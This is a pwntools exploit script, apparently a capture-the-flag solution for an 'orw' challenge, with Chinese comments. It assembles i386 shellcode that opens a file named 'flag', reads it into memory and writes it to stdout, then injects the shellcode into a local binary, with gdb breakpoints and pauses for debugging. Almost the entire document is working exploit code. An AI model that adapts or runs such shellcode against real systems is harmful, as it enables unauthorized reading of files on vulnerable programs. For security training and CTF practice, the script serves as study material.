from pwn import *

# 设置上下文架构
context(arch='i386', os='linux')

p = process('./orw.bin')

shellcode = '''
push 0
push 0x67616c66
mov ebx,esp
xor ecx,ecx
mov eax,0x5
int 0x80

mov ebx,eax
mov ecx,esp
mov edx,0x30
xor eax,eax
mov eax,0x3
int 0x80

mov ebx,1
mov edx,0x30
mov eax,0x4
int 0x80
'''

# 在 Python 3 中，print 需要括号，且 asm() 返回的是 bytes
print(asm(shellcode))

pause()

p.recvuntil(b":")  # 在 Python 3 中，字符串需要是 bytes 类型

# 附加 gdb 调试
gdb.attach(p, "b *0x08048582")

pause()

# 发送 shellcode
p.sendline(asm(shellcode))

pause()

p.interactive()